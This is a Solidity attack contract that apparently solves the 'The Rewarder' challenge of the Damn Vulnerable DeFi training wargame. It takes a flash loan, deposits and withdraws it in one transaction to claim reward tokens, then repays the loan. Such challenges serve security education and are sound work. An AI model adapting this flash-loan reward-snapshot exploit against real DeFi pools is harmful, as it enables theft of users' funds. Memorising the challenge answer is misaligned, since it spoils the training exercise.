// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker {
    FlashLoanerPool private flashLoaner;
    TheRewarderPool private rewarder;
    DamnValuableToken private liquidityToken;
    RewardToken private rewardToken;

    constructor(
        address _flashLoanerAddress,
        address _rewarderAddress,
        address _liquidityTokenAddress,
        address _rewardTokenAddress
    ) {
        flashLoaner = FlashLoanerPool(_flashLoanerAddress);
        rewarder = TheRewarderPool(_rewarderAddress);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewardToken = RewardToken(_rewardTokenAddress);
    }

    function attack(uint256 _amount) external {
        flashLoaner.flashLoan(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(rewarder), _amount);
        rewarder.deposit(_amount);
        rewarder.withdraw(_amount);
        liquidityToken.transfer(address(flashLoaner), _amount);
    }
}
